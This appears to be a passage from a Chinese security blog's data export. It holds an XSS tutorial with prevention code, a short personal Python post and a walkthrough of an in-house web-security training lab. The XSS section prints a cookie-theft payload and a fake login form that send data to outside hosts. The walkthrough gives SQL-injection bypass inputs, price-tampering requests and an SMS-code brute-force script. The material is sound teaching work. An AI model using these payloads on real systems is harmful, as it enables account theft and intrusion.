存储型XSS</h3><p>存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>\n<h2 id=\"0x02-XSS攻击的手段及其危害\"><a href=\"#0x02-XSS攻击的手段及其危害\" class=\"headerlink\" title=\"0x02 XSS攻击的手段及其危害\"></a>0x02 XSS攻击的手段及其危害</h2><h3 id=\"1-窃取Cookie\"><a href=\"#1-窃取Cookie\" class=\"headerlink\" title=\"1. 窃取Cookie\"></a>1. 窃取Cookie</h3><p>具体实现方法：<br>先构造语句<code>&lt;script&gt;window.open(&#39;http://dlgyi.rrvv.net/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code><br>这句话意思是打开一个新的窗口，访问<a href=\"http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\">http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。</a></p>\n<h3 id=\"2-引导钓鱼\"><a href=\"#2-引导钓鱼\" class=\"headerlink\" title=\"2. 引导钓鱼\"></a>2. 引导钓鱼</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hack</span>(<span class=\"params\"></span>)</div><div class=\"line\"></span>&#123;</div><div class=\"line\">                   location.replace(“http:<span class=\"comment\">//www.attackpage.com/record.asp?username=“</span></div><div class=\"line\">+<span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].user.value + “password=” + <span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].pass.value);</div><div class=\"line\">&#125;</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">HR</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">H3</span>&gt;</span>这个功能需要登录:<span class=\"tag\">&lt;/<span class=\"name\">H3</span> &gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>请输入用户名：<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”text”</span> <span class=\"attr\">id</span>=<span class=\"string\">”user”name</span>=<span class=\"string\">”user”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>请输入密码：<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”password”</span> <span class=\"attr\">name</span> =<span class=\"string\">“pass”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">”submit”name</span>=<span class=\"string\">”login”</span> <span class=\"attr\">value</span>=<span class=\"string\">”登录”onclick</span>=<span class=\"string\">”hack()”</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">HR</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。</p>","more":"<h2 id=\"0x03-XSS的预防\"><a href=\"#0x03-XSS的预防\" class=\"headerlink\" title=\"0x03 XSS的预防\"></a>0x03 XSS的预防</h2><h3 id=\"1-前端过滤XSS\"><a href=\"#1-前端过滤XSS\" class=\"headerlink\" title=\"1. 前端过滤XSS\"></a>1. 前端过滤XSS</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">xssCheck</span>(<span class=\"params\">str,reg</span>)</span>&#123;</div><div class=\"line\">    <span class=\"keyword\">return</span> str ? str.replace(reg || <span class=\"regexp\">/[&amp;&lt;\"&gt;'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">a, b</span>) </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span>(b)&#123;</div><div class=\"line\">            <span class=\"keyword\">return</span> a;</div><div class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">            <span class=\"keyword\">return</span> &#123;</div><div class=\"line\">                <span class=\"string\">'&lt;'</span>:<span class=\"string\">'&amp;lt;'</span>,</div><div class=\"line\">                <span class=\"string\">'&amp;'</span>:<span class=\"string\">'&amp;amp;'</span>,</div><div class=\"line\">                <span class=\"string\">'\"'</span>:<span class=\"string\">'&amp;quot;'</span>,</div><div class=\"line\">                <span class=\"string\">'&gt;'</span>:<span class=\"string\">'&amp;gt;'</span>,</div><div class=\"line\">                <span class=\"string\">\"'\"</span>:<span class=\"string\">'&amp;#39;'</span>,</div><div class=\"line\">            &#125;[a]</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;) : <span class=\"string\">''</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"2-后端预防\"><a href=\"#2-后端预防\" class=\"headerlink\" title=\"2. 后端预防\"></a>2. 后端预防</h3><h4 id=\"spring提供的方法\"><a href=\"#spring提供的方法\" class=\"headerlink\" title=\"spring提供的方法\"></a>spring提供的方法</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>defaultHtmlEscape<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">Forms加上：<span class=\"tag\">&lt;<span class=\"name\">spring:htmlEscape</span> <span class=\"attr\">defaultHtmlEscape</span>=<span class=\"string\">\"true\"</span> /&gt;</span></div></pre></td></tr></table></figure>\n<h4 id=\"手动escape\"><a href=\"#手动escape\" class=\"headerlink\" title=\"手动escape\"></a>手动escape</h4><p>首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);</p>\n<h4 id=\"后台加Filter\"><a href=\"#后台加Filter\" class=\"headerlink\" title=\"后台加Filter\"></a>后台加Filter</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> String <span class=\"title\">cleanXSS</span><span class=\"params\">(String value)</span> </span>&#123;</div><div class=\"line\">    <span class=\"comment\">//You'll need to remove the spaces from the html entities below</span></div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"&lt;\"</span>, <span class=\"string\">\"&amp; lt;\"</span>).replaceAll(<span class=\"string\">\"&gt;\"</span>, <span class=\"string\">\"&amp; gt;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"\\\\(\"</span>, <span class=\"string\">\"&amp; #40;\"</span>).replaceAll(<span class=\"string\">\"\\\\)\"</span>, <span class=\"string\">\"&amp; #41;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"&amp; #39;\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"eval\\\\((.*)\\\\)\"</span>, <span class=\"string\">\"\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\"</span>, <span class=\"string\">\"\\\"\\\"\"</span>);</div><div class=\"line\">    value = value.replaceAll(<span class=\"string\">\"script\"</span>, <span class=\"string\">\"\"</span>);</div><div class=\"line\">    <span class=\"keyword\">return</span> value;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"0x04-一款XSS漏洞检测爬虫-XSScrapy\"><a href=\"#0x04-一款XSS漏洞检测爬虫-XSScrapy\" class=\"headerlink\" title=\"0x04 一款XSS漏洞检测爬虫 - XSScrapy\"></a>0x04 一款XSS漏洞检测爬虫 - XSScrapy</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">./xsscrapy.py -u http://example.com</div><div class=\"line\">./xsscrapy.py -u http://example.com/login_page <span class=\"_\">-l</span> loginname</div></pre></td></tr></table></figure>\n<h2 id=\"0x05-XSS练习\"><a href=\"#0x05-XSS练习\" class=\"headerlink\" title=\"0x05 XSS练习\"></a>0x05 XSS练习</h2><p><a href=\"http://vulnweb.janusec.com/index-xss.php\">http://vulnweb.janusec.com/index-xss.php</a></p>\n<h2 id=\"0x06-推荐站点\"><a href=\"#0x06-推荐站点\" class=\"headerlink\" title=\"0x06 推荐站点\"></a>0x06 推荐站点</h2><ul>\n<li><a href=\"http://drops.wooyun.org/\">WooYun知识库</a></li>\n<li><a href=\"http://www.freebuf.com/\">FreeBuf黑客与极客</a></li>\n<li><a href=\"http://www.sec-wiki.com/index.php\">SecWiki</a></li>\n</ul>\n<h2 id=\"0x07-参考文档\"><a href=\"#0x07-参考文档\" class=\"headerlink\" title=\"0x07 参考文档\"></a>0x07 参考文档</h2><ul>\n<li><a href=\"http://www.freebuf.com/articles/web/40520.html\">XSS的原理分析与解剖</a></li>\n<li><a href=\"http://www.freebuf.com/articles/web/42727.html\">XSS的原理分析与解剖（第二篇）</a></li>\n<li><a href=\"http://drops.wooyun.org/web/13009\">前端防御XSS</a></li>\n<li><a href=\"http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html\">Spring MVC防御CSRF、XSS和SQL注入攻击</a></li>\n<li><a href=\"http://itindex.net/detail/51089-xss-xsscrapy\">快速、直接的XSS漏洞检测爬虫 – XSScrapy</a></li>\n<li><a href=\"https://github.com/DanMcInerney/xsscrapy\">xsscrapy</a></li>\n</ul>"},{"title":"python 520","date":"2016-05-22T11:04:00.000Z","_content":"\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n## 一、前言\n最近跟老婆大人都在学习python。\n正值一年一度的5月20号之际，给老婆的礼物除了发520的红包外，就是这个老婆让我帮她完成的小小python程序了。\n\n## 二、代码\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\n\nif __name__ == '__main__':\n    while True:\n        s = raw_input(\"请输入甜言蜜语：\")\n        if s == 'exit' or s == 'quit':\n            break;\n\n        print '爱的回应：六点就走，回家陪你。'\n```\n\n\n## 三、运行截图\n![520运行图](/asserts/images/article/python 520/520_run.png)\n","source":"_posts/article/python/python 520.md","raw":"tags:\n  - python\ncategories:\n  - 系统脚本\ntitle: python 520\ndate: 2016-05-22 19:04:00\n---\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n## 一、前言\n最近跟老婆大人都在学习python。\n正值一年一度的5月20号之际，给老婆的礼物除了发520的红包外，就是这个老婆让我帮她完成的小小python程序了。\n\n## 二、代码\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\n\nif __name__ == '__main__':\n    while True:\n        s = raw_input(\"请输入甜言蜜语：\")\n        if s == 'exit' or s == 'quit':\n            break;\n\n        print '爱的回应：六点就走，回家陪你。'\n```\n\n\n## 三、运行截图\n![520运行图](/asserts/images/article/python 520/520_run.png)\n","slug":"article/python/python 520","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxun006n5nbtj00r38rs","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近跟老婆大人都在学习python。<br>正值一年一度的5月20号之际，给老婆的礼物除了发520的红包外，就是这个老婆让我帮她完成的小小python程序了。</p>\n<h2 id=\"二、代码\"><a href=\"#二、代码\" class=\"headerlink\" title=\"二、代码\"></a>二、代码</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        s = raw_input(<span class=\"string\">\"请输入甜言蜜语：\"</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> s == <span class=\"string\">'exit'</span> <span class=\"keyword\">or</span> s == <span class=\"string\">'quit'</span>:</div><div class=\"line\">            <span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'爱的回应：六点就走，回家陪你。'</span></div></pre></td></tr></table></figure>\n<h2 id=\"三、运行截图\"><a href=\"#三、运行截图\" class=\"headerlink\" title=\"三、运行截图\"></a>三、运行截图</h2><p><img src=\"/asserts/images/article/python 520/520_run.png\" alt=\"520运行图\"></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近跟老婆大人都在学习python。<br>正值一年一度的5月20号之际，给老婆的礼物除了发520的红包外，就是这个老婆让我帮她完成的小小python程序了。</p>\n<h2 id=\"二、代码\"><a href=\"#二、代码\" class=\"headerlink\" title=\"二、代码\"></a>二、代码</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        s = raw_input(<span class=\"string\">\"请输入甜言蜜语：\"</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> s == <span class=\"string\">'exit'</span> <span class=\"keyword\">or</span> s == <span class=\"string\">'quit'</span>:</div><div class=\"line\">            <span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'爱的回应：六点就走，回家陪你。'</span></div></pre></td></tr></table></figure>\n<h2 id=\"三、运行截图\"><a href=\"#三、运行截图\" class=\"headerlink\" title=\"三、运行截图\"></a>三、运行截图</h2><p><img src=\"/asserts/images/article/python 520/520_run.png\" alt=\"520运行图\"></p>\n"},{"title":"WEB安全渗透分享","date":"2016-03-15T10:08:00.000Z","_content":"<img src=\"/asserts/images/logo/hack.png\" class=\"img-logo img-center\" />\n\n\nWEB安全渗透靶场：http://10.4.236.115:8080/\n是否开放所有关卡切换：http://10.4.236.115:8080/sohu/switchOpenStage\n\n\n## 0x00 前言\n此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。\n\n为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 `angularjs`、`jquery`、`spring`、`spring mvc`、`mybatis`、`mysql` 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。\n如发现问题，请各位见谅哈。\n\n\n### 1. 用户登记\n主要是为了收集用户名信息，进行登记，用于记录闯关进度!\n\n界面如下图所示：\n![用户登记]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png)\n![用户登记]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_1.png)\n\n\n### 2. 用户主页\n简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。\n\n界面如下图所示：\n![用户主页]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png)\n![用户主页]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_3.png)\n\n\n<!-- more -->\n\n## 0x01 关卡1\n属于热身题，纯属练手，引导用户在之后的关卡中找到更多破解信息。\n\n### 1. 提示\n提示如下：\n> 任务目标：找出正确的用户名与密码并通过验证。\nTips：这个页面用户与密码不需要去服务器交互验证。\n\n### 2. 界面\n界面如下图所示：\n![关卡1]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png)\n![关卡1]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_4.png)\n\n### 3. 揭密\n用户名密码直接写在了页面的js逻辑里，跟随页面元素js操作即可找到对应的内容。\n![关卡1-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png)\n![关卡1-页面代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_5.png)\n![关卡1-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png)\n![关卡1-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_6.png)\n\n由此，可见第一关的用户名密码如下：\n``` javascript\nvar stage1Username = \"stage1_user\";\nvar state1Password = \"tHis1Is3aSim3p#ab$\";\n```\n\n### 4. 小结\n一般不会出现此类小白程序员的情况。\n\n\n## 0x02 关卡2\n这是一道SQL注入题。\n\nSQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。\n\n### 1. 提示\n提示如下：\n> 任务目标：本题没有可登入的用户名密码，请绕过登录验证。\nTips：就算是判断了用户名 and 密码 都正确，也是被禁用的。\n\n### 2. 界面\n界面如下图所示：\n![关卡2]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png)\n![关卡2]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_7.png)\n\n### 3. 揭密\n对于sql而言，有些特殊字符（如：单引号，--，\\，#等）、保留字（如：select，values，delete等）和内置函数（date，time，concat等），使用不当都有可能会导致SQL执行错误。\n\n由此，我们尝试使用单引号，发现登录异常提示如下：\n![特殊字符注入]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png)\n![特殊字符注入]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_12.png)\n\n并且，发现在控制台出现如下异常信息：\n``` bash\nStatementCallback; bad SQL grammar [select count(id) from user2 where username = ''' and password = '']; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password = ''' at line 1\n```\n\n从异常内容可以发现，出错的SQL内容为：\n``` sql\nselect count(id) from user2 where username = ''' and password = ''\n```\n\n于是乎就从盲目地注入，变成了有针对性的注入。\n针对于此，可以填写如下内容进入SQL注入：\n``` sql\nusername: \\\npassword: or '' = '\n\nusername: \\\npassword: or 1 != '\n\nusername: ' or 1 !=\npassword: '--\n\nusername: ' or 1 !=\npassword: '--\n\nusername: ' or 1=1 -- x\nusername: ' or 1=1 #\n```\n\n**注**：答案可以很多。\n\n\n### 4. 小结\n- 避免出现一些详细的错误消息，异常不要抛出来，在服务器端打印日志用于异常分析就好。\n- 永远不要使用动态拼装sql，使用数据库或开发框架提供的参数化查询接口。\n- 机密信息不要直接存放，加密或者hash密码和敏感的信息再存储。\n- 用户输入过滤：对特殊字符单引号和双\"-\"等进行转义处理或编码转换。\n- SQL注入检测工具进行检测。如：sqlmap、SQLninja等。\n\n\n### 5. 参考文档\n- [SQL 注入](http://php.net/manual/zh/security.database.sql-injection.php)\n- [SQL注入技术](http://baike.baidu.com/view/3896.htm#3)\n- [9.4 避免SQL注入](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md)\n\n\n## 0x03 关卡3\n\n### 1. 提示\n提示如下：\n> 任务目标：找到通关后台，并将自己的通关数目加一级\nTips：答案不在本页\n\n### 2. 界面\n界面如下图所示：\n![关卡3]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png)\n![关卡3]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_13.png)\n\n### 3. 揭密\n由提示找到通关后台可知，找到后台是关键。\n一般地，常规后台命名为admin、admin\\index、manage、dashboard等。\n\n尝试如下地址：http://localhost:8080/sohu/index#/admin\n于是进入了后台管理界面，如下图所示：\n![WEB安全渗透实战-后台管理系统\n]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png)\n]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_15.png)\n![后台管理系统-升级]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png)\n![后台管理系统-升级]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160308_16.png)\n\n尝试点击**升级**直接通关，其他所有内容其实都是假的。\n\n\n### 4. 小结\n后台弱口令\n\n\n## 0x04 关卡4\n将非最高价格物品价格修改为负值，从而增加自己的虚拟货币，然后再买最高价格物品。\n\n### 1. 提示\n提示如下：\n> 任务目标：通过本页面提供的虚拟货币购买价值最高的物品\nTips：0 - (-1) = 1\n\n### 2. 界面\n界面如下图所示：\n![关卡4]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png)\n![关卡4]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_21.png)\n\n### 3. 揭密\n由于初始时每人只拥有5000000的虚拟货币，完全不只以购买价值最高的物品。\n因为要购买前需要增加自己的虚拟货币。\n\n再根据下面的提示说0 - (-1) = 1，可与购买联想到：购买物品时，修改传到后端的价格为负数，来达到为自己增加虚拟货币的目的。\n\n于是我们尝试购买价格为399的物品。系统提示：购买成功，但是未购买价值最高的物品，如下图所示：\n![未购买最高价值的物品]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png)\n![未购买最高价值的物品]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_22.png)\n\n我们再通过console可以看到，发出的POST请求为：http://10.4.236.115:8080/sohu/stage4/pass?id=1&price=399\n\n查看购买的js请求代码如下：\n![关卡4-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png)\n![关卡4-js代码]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_23.png)\n\n在下一次购买请求时，设置price值为 -7999999 。请求完成后，依然提示购买失败的消息，但是虚拟货币却变成了：12999600。\n\n于是，我们就可以开开心心地购买最高价格的物品了。\n\n完成的js操作如下所示：\n``` javascript\n// 增加虚拟货币\nvar url = 'http://10.4.236.115:8080/sohu/stage4/pass?id=1&price=-7999999';\n$.ajax({\n    method: 'post',\n    async: false,\n    url: url,\n    success: function(data) {\n        if (data.status == 200) {\n            console.log('SUCCESS');\n        }\n    }\n});\n\n// 购买最高价格物品\nvar url = 'http://10.4.236.115:8080/sohu/stage4/pass?id=3&price=7999999';\n$.ajax({\n    method: 'post',\n    async: false,\n    url: url,\n    success: function(data) {\n        if (data.status == 200) {\n            console.log('SUCCESS');\n        }\n    }\n});\n```\n\n### 4. 小结\n虽然做了不能够买比自己持有总金额高的物品的检验，但是未校验物品金额不允许为负数，也未校验id对应的物品金额与实际金额是否相符。\n对于关键逻辑，对参数做更加严格的校验。\n\n\n## 0x05 关卡5\n暴力破解\n\n### 1. 提示\n提示如下：\n> 任务目标：通过收到的短信验证码完成手机验证。\nTips：有时候采用最原始的方法收到的效果反而更显著。\n\n### 2. 界面\n界面如下图所示：\n![关卡5]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png)\n![关卡5]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_24.png)\n\n### 3. 揭密\n从Tips里提到的最原始的方法，大概能猜测到最直接的破解方式：**字典破解** 或 **暴力破解**。\n要么验证码是个弱密码，要么验证码很方便枚举出来。\n\n接下来，点击“获取短信验证码”，提示：新的3位数字验证码已经通过短信，发送到13800138000的手机上，请注意查收！\n因此，可见验证码可以枚举出来，只需要发起不超过1000次请求即可找到验证码。\n\n看过js请求代码，了解请求构造后，可以使用如下操作暴破：\n``` javascript\nvar url = 'http://10.4.236.115:8080/sohu/sms/code/verfiy';\nvar len = 1000;\nfor (var i = 0; i < len; i++) {\n\t$.ajax({\n\t\tmethod: 'post',\n        async: false,\n\t\turl: url + '?phone=13800138000&code=' + i,\n\t\tsuccess: function(data) {\n\t\t\tif (data.status == 200) {\n\t\t\t\tconsole.log('code:' + i);\n\t\t\t\ti = len;\n\t\t\t}\n\t\t}\n\t});\n}\n```\n\n暴破完成后，会打印出对应的验证码，之后即可通过dashboard页直接进入下一关。\n\n**注**：考虑验证码可能会补扩散开，因此每次有人过关，验证码就会重新刷新一次。\n\n### 4. 小结\n尽量不要设置容易枚举的密码或验证码。同时，对于敏感信息可以加上一些限制，类似于：时效性限制或者一天内允许尝试失败次数等。\n\n\n## 0x06 关卡6\n读取服务器上的文件\n\n### 1. 提示\n提示如下：\n> 任务目标：找到可以通过本关的密码并提交。\nTips：密码被硬编码到了当前页面服务器上的php代码里。\n\n### 2. 界面\n界面如下图所示：\n![关卡6]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png)\n![关卡6]http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png)\n\n### 3. 